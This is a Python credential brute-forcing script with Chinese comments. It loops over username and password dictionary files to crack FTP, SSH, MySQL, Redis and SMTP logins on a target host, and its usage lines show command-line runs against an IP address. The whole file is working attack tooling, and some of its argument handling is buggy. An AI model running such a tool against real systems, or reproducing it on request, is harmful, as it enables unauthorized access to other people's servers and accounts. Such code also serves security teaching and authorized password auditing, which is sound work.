from ftplib import FTP
import paramiko
import pymysql
import redis
import smtplib
import os,sys
 
def ftp_check(ip,username,password):
    ftp = FTP()
    print('check->'+ip+'|'+username+'|'+password)
    try:
        ftp.connect(ip, 21)
        ftp.login(username,password)
        print('success')
        exit()
    except Exception as e:
        print('failed')
 
def ssh_check(ip,username,password):
    print('check->' + ip + '|' + username + '|' + password)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip,"22",username,password)
        print('success')
        exit()
    except Exception as e:
        print('failed')
 
def mysql_check(ip,username,password):
    print('check->' + ip + '|' + username + '|' + password)
    try:
        conn_obj = pymysql.connect(
            host=ip,  # MySQL服务端的IP地址
            port=3306,  # MySQL默认PORT地址(端口号)
            user=username,  # 用户名
            password=password,  # 密码,也可以简写为passwd
            database='mysql',  # 库名称,也可以简写为db
            charset='utf8'  # 字符编码
        )
        print('success')
        exit()
    except Exception as e:
        pass
 
def redis_check(ip,password):
    print('check->' + ip + '|' + password)
    try:
        redis_conn = redis.Redis(host=ip, port=6379, password=password, db=0)
        redis_conn.set('test', 'xiaodi')
        print('success')
        exit()
    except Exception as e:
        pass
 
def email_check(ip,username,password):
    print('check->' + ip + '|' +username+'|'+ password)
    try:
        smtpObj = smtplib.SMTP()
        smtpObj.connect('smtp.'+ip, 25)  # 25 为 SMTP 端口号
        smtpObj.login(username, password)
        print('ok')
        exit()
    except smtplib.SMTPException:
        print("Error")
 
if __name__ == '__main__':
    pypath = os.getcwd()
    print('eg:固定字典使用说明：')
    print('python all.py ftp 127.0.0.1')
    print('python all.py ssh 127.0.0.1')
    print('python all.py redis 127.0.0.1')
    print('python all.py mysql 127.0.0.1')
    print('python all.py email')
    print('eg:自定义字典使用说明：')
    print('python all.py ftp 127.0.0.1 user.txt pass.txt')
    print('python all.py ssh 127.0.0.1 user.txt pass.txt')
    print('python all.py redis 127.0.0.1 user.txt pass.txt')
    print('python all.py mysql 127.0.0.1 user.txt pass.txt')
    print('python all.py email user.txt pass.txt')
    xy=sys.argv[1]
    ip=sys.argv[2]
    zidian = sys.argv[3]
    zidian2=sys.argv[4]
 
    #没有设置自定义字典，采用固定字典
    if len(zidian)==0:
        if xy=='ftp':
            for username in open(pypath + '/conf/dic_username_ftp.txt'):
                username = username.replace('\n', '')
                for password in open(pypath + '/conf/dic_password_ftp.txt'):
                    password = password.replace('\n', '')
                    ftp_check(ip, username, password)
        elif xy=='ssh':
            for username in open(pypath + '/conf/dic_username_ssh.txt'):
                username = username.replace('\n', '')
                for password in open(pypath + '/conf/dic_password_ssh.txt'):
                    password = password.replace('\n', '')
                    ssh_check(ip, username, password)
        elif xy=='mysql':
            for username in open(pypath + '/conf/dic_username_mysql.txt'):
                username = username.replace('\n', '')
                for password in open(pypath + '/conf/dic_password_mysql.txt'):
                    password = password.replace('\n', '')
                    mysql_check(ip, username, password)
        elif xy=='redis':
            for password in open(pypath + '/conf/dic_password_redis.txt'):
                password = password.replace('\n', '')
                redis_check(ip, password)
        elif xy=='email':
            for username in open(pypath + '/conf/dic_username_email.txt'):
                username = username.replace('\n', '')
                ip = username.split('@')[1]
                for password in open(pypath + '/conf/dic_password_email.txt'):
                    password = password.replace('\n', '')
                    email_check(ip, username, password)
    #设置了自定义字典，自定义字典爆破（代码只修改的ftp）
    else:
        if xy=='ftp':
            for username in open(pypath +'\\'+ zidian):
                username = username.replace('\n', '')
                for password in open(pypath +'\\'+ zidian2):
                    password = password.replace('\n', '')
                    ftp_check(ip, username, password)
        elif xy=='ssh':
            for username in open(pypath + '/conf/dic_username_ssh.txt'):
                username = username.replace('\n', '')
                for password in open(pypath + '/conf/dic_password_ssh.txt'):
                    password = password.replace('\n', '')
                    ssh_check(ip, username, password)
        elif xy=='mysql':
            for username in open(pypath + '/conf/dic_username_mysql.txt'):
                username = username.replace('\n', '')
                for password in open(pypath + '/conf/dic_password_mysql.txt'):
                    password = password.replace('\n', '')
                    mysql_check(ip, username, password)
        elif xy=='redis':
            for password in open(pypath + '/conf/dic_password_redis.txt'):
                password = password.replace('\n', '')
                redis_check(ip, password)
        elif xy=='email':
            for username in open(pypath + '/conf/dic_username_email.txt'):
                username = username.replace('\n', '')
                ip = username.split('@')[1]
                for password in open(pypath + '/conf/dic_password_email.txt'):
                    password = password.replace('\n', '')
                    email_check(ip, username, password)
